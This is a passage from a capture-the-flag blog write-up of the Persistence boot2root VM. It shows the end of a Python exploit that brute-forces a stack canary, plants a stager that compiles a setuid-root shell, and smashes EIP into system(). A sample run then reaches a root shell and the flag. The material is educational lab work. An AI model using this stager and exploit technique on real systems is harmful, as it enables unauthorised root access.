+    <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Canary known as : {0}&#34;</span><span style="color:#ff79c6">.</span>format(canary<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#34;hex&#34;</span>))
+    <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Writing /tmp/log to be called by wopr later&#34;</span>
+
+    <span style="color:#6272a4"># ./wopr has the string /tmp/log in it. We will use this as</span>
+    <span style="color:#6272a4"># our code exec point, overwriting whatever is in it atm</span>
+    stager <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">        #!/bin/sh
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">        # First, prepare a small C shell and move it to /tmp with name getroot
+</span><span style="color:#f1fa8c">        echo &#34;int main(void)</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">{</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">setuid(0);</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">system(</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\\</span><span style="color:#f1fa8c">&#34;);</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">return 0;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">}&#34; &gt; /tmp/getroot.c
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">        # compile it
+</span><span style="color:#f1fa8c">        /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">        # change ownership and setuid
+</span><span style="color:#f1fa8c">        /bin/chown root:root /tmp/getroot
+</span><span style="color:#f1fa8c">        /bin/chmod 4777 /tmp/getroot
+</span><span style="color:#f1fa8c">    &#34;&#34;&#34;</span>
+
+    <span style="color:#6272a4"># write the file</span>
+    <span style="color:#ff79c6">with</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#39;/tmp/log&#39;</span>,<span style="color:#f1fa8c">&#39;w&#39;</span>) <span style="color:#ff79c6">as</span> stager_file:
+        stager_file<span style="color:#ff79c6">.</span>write(stager)
+
+    <span style="color:#6272a4"># make it executable</span>
+    os<span style="color:#ff79c6">.</span>chmod(<span style="color:#f1fa8c">&#39;/tmp/log&#39;</span>, <span style="color:#bd93f9">0755</span>)
+
+    <span style="color:#6272a4"># now, with the stack canary known and the stager ready, lets corrupt</span>
+    <span style="color:#6272a4"># EIP and sploit!</span>
+    payload <span style="color:#ff79c6">+=</span> canary               <span style="color:#6272a4"># canary we bruted</span>
+    payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;A&#34;</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">4</span>              <span style="color:#6272a4"># padding to EIP wich is at byte 42</span>
+    payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x10\x62\xe5\xb7</span><span style="color:#f1fa8c">&#34;</span>   <span style="color:#6272a4"># system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails.</span>
+    payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;JUNK&#34;</span>               <span style="color:#6272a4"># JUNK. Should probably do exit() here. Meh.</span>
+    payload <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x60\x8c\x04\x08</span><span style="color:#f1fa8c">&#34;</span>   <span style="color:#6272a4"># location if /tmp/log string in .data</span>
+
+    <span style="color:#6272a4"># and connect &amp;&amp; send</span>
+    <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Connecting to service&#34;</span>
+    sock <span style="color:#ff79c6">=</span> socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET, socket<span style="color:#ff79c6">.</span>SOCK_STREAM)
+    sock<span style="color:#ff79c6">.</span>connect((<span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>, <span style="color:#bd93f9">3333</span>))
+    sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">35</span>)
+    sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">40</span>)
+    sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">5</span>)
+    <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Sending Payload&#34;</span>
+    sock<span style="color:#ff79c6">.</span>send(payload)
+
+    sock<span style="color:#ff79c6">.</span>recv(<span style="color:#bd93f9">64</span>)
+    sock<span style="color:#ff79c6">.</span>close()
+    <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] Done&#34;</span>
+
+    <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)&#34;</span>
+    os<span style="color:#ff79c6">.</span>system(<span style="color:#f1fa8c">&#34;/tmp/getroot&#34;</span>)
+
+<span style="color:#ff79c6">else</span>:
+    <span style="color:#ff79c6">print</span> <span style="color:#f1fa8c">&#34;[!] Incomplete Canary. Can&#39;t continue reliably&#34;</span>
+
+<span style="color:#6272a4"># done</span>
+</code></pre></div><p>A sample run would be:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash-4.1$ ls -lah /tmp/sploit.py
+-rw-rw-r--. <span style="color:#bd93f9">1</span> avida avida 4.0K Sep <span style="color:#bd93f9">18</span> 10:33 /tmp/sploit.py
+bash-4.1$ python /tmp/sploit.py
+
+            A: <span style="color:#f1fa8c">&#34;So, I heard you like pain...?&#34;</span>
+            B: <span style="color:#f1fa8c">&#34;... a bit&#34;</span>
+            C: <span style="color:#f1fa8c">&#34;Well, here it is, the: &#34;</span>
+ ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
+|    <span style="color:#f1fa8c">\ </span>/  _<span style="color:#ff79c6">]</span>|    <span style="color:#f1fa8c">\ </span> / ___/|    / ___/|      |  /  _<span style="color:#ff79c6">]</span>|    <span style="color:#f1fa8c">\ </span>  /  <span style="color:#ff79c6">]</span>  /  _<span style="color:#ff79c6">]</span>
+|  o  <span style="color:#ff79c6">)</span>  <span style="color:#ff79c6">[</span>_ |  D  <span style="color:#ff79c6">)(</span>   <span style="color:#f1fa8c">\_</span>  |  <span style="color:#ff79c6">(</span>   <span style="color:#f1fa8c">\_</span> |      | /  <span style="color:#ff79c6">[</span>_ |  _  | /  /  /  <span style="color:#ff79c6">[</span>_
+|   _/    _<span style="color:#ff79c6">]</span>|    /  <span style="color:#f1fa8c">\_</span>_  | |  |<span style="color:#f1fa8c">\_</span>_  <span style="color:#ff79c6">||</span>_|  |_<span style="color:#ff79c6">||</span>    _<span style="color:#ff79c6">]</span>|  |  |/  /  |    _<span style="color:#ff79c6">]</span>
+|  | |   <span style="color:#ff79c6">[</span>_ |    <span style="color:#f1fa8c">\ </span> /  <span style="color:#f1fa8c">\ </span>| |  |/  <span style="color:#f1fa8c">\ </span>|  |  |  |   <span style="color:#ff79c6">[</span>_ |  |  /   <span style="color:#f1fa8c">\_</span> |   <span style="color:#ff79c6">[</span>_
+|  | |     <span style="color:#ff79c6">||</span>  .  <span style="color:#f1fa8c">\ \ </span>   | |  |<span style="color:#f1fa8c">\ </span>   |  |  |  |     <span style="color:#ff79c6">||</span>  |  <span style="color:#f1fa8c">\ </span>    <span style="color:#ff79c6">||</span>     |
+|__| |_____<span style="color:#ff79c6">||</span>__|<span style="color:#f1fa8c">\_</span>|  <span style="color:#f1fa8c">\_</span>__<span style="color:#ff79c6">||</span>____|<span style="color:#f1fa8c">\_</span>__|  |__|  |_____<span style="color:#ff79c6">||</span>__|__|<span style="color:#f1fa8c">\_</span>___<span style="color:#ff79c6">||</span>_____|
+      _____ ____  _       ___  ____  ______
+     / ___/|    <span style="color:#f1fa8c">\|</span> |     /   <span style="color:#f1fa8c">\|</span>    <span style="color:#ff79c6">||</span>      |
+    <span style="color:#ff79c6">(</span>   <span style="color:#f1fa8c">\_</span> |  o  <span style="color:#ff79c6">)</span> |    |     <span style="color:#ff79c6">||</span>  | |      |
+     <span style="color:#f1fa8c">\_</span>_  <span style="color:#ff79c6">||</span>   _/| |___ |  O  <span style="color:#ff79c6">||</span>  | |_|  |_|
+     /  <span style="color:#f1fa8c">\ </span><span style="color:#ff79c6">||</span>  |  |     <span style="color:#ff79c6">||</span>     <span style="color:#ff79c6">||</span>  |   |  |
+     <span style="color:#f1fa8c">\ </span>   <span style="color:#ff79c6">||</span>  |  |     <span style="color:#ff79c6">||</span>     <span style="color:#ff79c6">||</span>  |   |  |
+      <span style="color:#f1fa8c">\_</span>__<span style="color:#ff79c6">||</span>__|  |_____| <span style="color:#f1fa8c">\_</span>__/|____|  |__|
+
+                A: <span style="color:#f1fa8c">&#34;AKA: FU superkojiman &amp;&amp; sagi- !!&#34;</span>
+                A: <span style="color:#f1fa8c">&#34;I also have no idea what I am doing&#34;</span>
+
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Connecting &amp; starting canary bruteforce...
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Found a possible canary value of <span style="color:#f1fa8c">&#39;64&#39;</span>!
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Found a possible canary value of <span style="color:#f1fa8c">&#39;d3&#39;</span>!
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Found a possible canary value of <span style="color:#f1fa8c">&#39;c6&#39;</span>!
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Found a possible canary value of <span style="color:#f1fa8c">&#39;15&#39;</span>!
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Canary known as : 64d3c615
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Writing /tmp/log to be called by wopr later
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Connecting to service
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Sending Payload
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Done
+<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> going to try and spawn /tmp/getroot, assuming the sploit worked :<span style="color:#ff79c6">)</span>
+sh-4.1# id
+<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>500<span style="color:#ff79c6">(</span>avida<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>,500<span style="color:#ff79c6">(</span>avida<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">context</span><span style="color:#ff79c6">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+</code></pre></div><p>And, as proof, we cat the flag!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sh-4.1# cat /root/flag.txt
+              .d8888b.  .d8888b. <span style="color:#bd93f9">888</span>
+             d88P  Y88bd88P  Y88b888
+             <span style="color:#bd93f9">888</span>    <span style="color:#bd93f9">888888</span>    <span style="color:#bd93f9">888888</span>
+<span style="color:#bd93f9">888</span>  <span style="color:#bd93f9">888</span>  <span style="color:#bd93f9">888888</span>    <span style="color:#bd93f9">888888</span>    <span style="color:#bd93f9">888888888</span>
+<span style="color:#bd93f9">888</span>  <span style="color:#bd93f9">888</span>  <span style="color:#bd93f9">888888</span>    <span style="color:#bd93f9">888888</span>    <span style="color:#bd93f9">888888</span>
+<span style="color:#bd93f9">888</span>  <span style="color:#bd93f9">888</span>  <span style="color:#bd93f9">888888</span>    <span style="color:#bd93f9">888888</span>    <span style="color:#bd93f9">888888</span>
+Y88b <span style="color:#bd93f9">888</span> d88PY88b  d88PY88b  d88PY88b.
+ <span style="color:#f1fa8c">&#34;Y8888888P&#34;</span>  <span style="color:#f1fa8c">&#34;Y8888P&#34;</span>  <span style="color:#f1fa8c">&#34;Y8888P&#34;</span>  <span style="color:#f1fa8c">&#34;Y888
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">Congratulations!!! You have the flag!
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">We had a great time coming up with the
+</span><span style="color:#f1fa8c">challenges for this boot2root, and we
+</span><span style="color:#f1fa8c">hope that you enjoyed overcoming them.
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">Special thanks goes out to @VulnHub for
+</span><span style="color:#f1fa8c">hosting Persistence for us, and to
+</span><span style="color:#f1fa8c">@recrudesce for testing and providing
+</span><span style="color:#f1fa8c">valuable feedback!
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">Until next time,
+</span><span style="color:#f1fa8c">      sagi- &amp; superkojiman
+</span></code></pre></div><h2 id="conclusion">conclusion</h2>
+<p>Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- &amp;&amp; superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!</p>
+<h2 id="thats-not-all">thats not all</h2>
+<p>There are however a few more things I&rsquo;d like to try.</p>
+<ul>
+<li>Find if and how we can root Persistence using <code>sysadmin-tool</code></li>
+<li>Modify the exploit to a working ROP payload</li>
+<li>Explore other avenues to break out of rbash</li>
+</ul>
+    </div>
+  </article>
+
+  
+  
+
+
+
+
+  
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+          <script type="text/javascript">
+          
+          (function() {
+              
+              
+              
+              
+          
+              var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+              var disqus_shortname = 'slashnote';
+              dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+              (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+          })();
+          </script>
+          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+          <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        </div>
+    </div>
+
+  
+
+
+  <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://leonjza.github.io/">Home</a></li>
+         
+          <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#persist-we-must">persist we must!</a></li>
+    <li><a href="#lets-get-our-hands-dirty">lets get our hands dirty</a></li>
+    <li><a href="#finding-that-debugger">finding that (de)bugger</a></li>
+    <li><a href="#blind-command-injection">blind command injection</a></li>
+    <li><a href="#blind-command-injection---file-enumeration">blind command injection - file enumeration</a></li>
+    <li><a href="#blind-command-injection---port-scanner">blind command injection - port scanner</a></li>
+    <li><a href="#data-exfiltration">data exfiltration</a></li>
+    <li><a href="#sysadmin-tool">sysadmin-tool</a></li>
+    <li><a href="#shell-and-breakout-as-avida">shell and breakout as avida</a></li>
+    <li><a href="#the-wopr-game">the wopr game</a></li>
+    <li><a href="#wopr-stack-smashing">wopr, stack smashing</a></li>
+    <li><a href="#wopr---stack-canary-bruteforce">wopr - stack canary bruteforce</a></li>
+    <li><a href="#wopr---nx-and-eip">wopr - NX and EIP</a></li>
+    <li><a href="#wopr---code-exec">wopr - code exec</a></li>
+    <li><a href="#wopr---the-exploit">wopr - the exploit</a></li>
+    <li><a href="#conclusion">conclusion</a></li>
+    <li><a href="#thats-not-all">thats not all</a></li>
+  </ul>
+</nav>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f">
+      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&text=From%20Persistence">
+      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&title=From%20Persistence">
+      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&is_video=false&description=From%20Persistence">
+      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=From%20Persistence&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f">
+      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&title=From%20Persistence">
+      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&title=From%20Persistence">
+      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&title=From%20Persistence">
+      <i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&title=From%20Persistence">
+      <i class="fab fa-digg fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&name=From%20Persistence&description=%3ch2%20id%3d%22persist-we-must%22%3epersist%20we%20must%21%3c%2fh2%3e%0a%3cp%3ePersistence%21%20A%20new%20boot2root%20hosted%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fvulnhub%22%3e%40VulnHub%3c%2fa%3e%2c%20authored%20by%20%3ca%20href%3d%22https%3a%2f%2ftwitter.com%2fsuperkojiman%22%3e%40superkojiman%3c%2fa%3e%20and%20sagi-%20definitely%20got%20the%20attention%20from%20the%20community%20it%20deserves%21%20Persistence%20was%20actually%20part%20of%20a%20%3ca%20href%3d%22http%3a%2f%2fblog.vulnhub.com%2f2014%2f09%2fcompetition-persistence.html%22%3ewriteup%20competition%3c%2fa%3e%20launched%20on%20September%20the%207th%2c%20and%20ran%20up%20until%20October%20th%205th.%3c%2fp%3e%0a%3cp%3eThis%20is%20my%20experience%20while%20trying%20to%20complete%20the%20challenge.%20Persistence%2c%20once%20again%2c%20challenged%20me%20to%20learn%20about%20things%20that%20would%20normally%20have%20me%20just%20go%20%26ldquo%3bmeh%2c%20next%26rdquo%3b.%20As%20expected%2c%20this%20post%20is%20also%20a%20very%20big%20spoiler%20if%20you%20have%20not%20completed%20it%20yourself%20yet%2c%20so%20be%20warned%21%3c%2fp%3e">
+      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fposts%2f2014-09-18-from-persistence%2f&t=From%20Persistence">
+      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;">
+          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;">
+          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;">
+          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+
+  <footer id="footer">
+  <div class="footer-left">
+    Copyright  &copy; 2020  Leon Jacobs 
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+        <li><a href="https://leonjza.github.io/">Home</a></li>
+         
+        <li><a href="https://leonjza.github.io/about/">About Me</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+  </div>
+</body>
+
+<link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
+<script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
+<script src=https://leonjza.github.io/js/main.js></script>
+
+
+
+</html>
